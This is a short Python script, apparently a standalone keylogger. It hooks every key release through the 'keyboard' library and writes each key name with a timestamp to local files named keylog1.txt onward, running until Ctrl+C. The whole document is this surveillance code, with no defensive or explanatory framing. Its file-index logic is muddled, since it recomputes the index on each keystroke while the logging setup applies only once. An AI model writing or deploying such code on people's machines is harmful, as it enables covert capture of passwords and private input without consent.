import keyboard
import logging
import os

def main():
    # Start recording keystrokes
    keyboard.on_release(callback=record_keystroke)

    # Keep the program running until Ctrl + C is pressed
    try:
        keyboard.wait('ctrl+c')
    except KeyboardInterrupt:
        print("Exiting...")

def record_keystroke(event):
    # Get the index of the next log file
    index = get_next_log_index()

    # Configure logging
    filename = f'keylog{index}.txt'
    logging.basicConfig(filename=filename, level=logging.DEBUG, format='%(asctime)s - %(message)s')

    # Log the pressed key
    logging.info(event.name)

def get_next_log_index():
    index = 1
    while os.path.exists(f'keylog{index}.txt'):
        index += 1
    return index

if __name__ == "__main__":
    main()

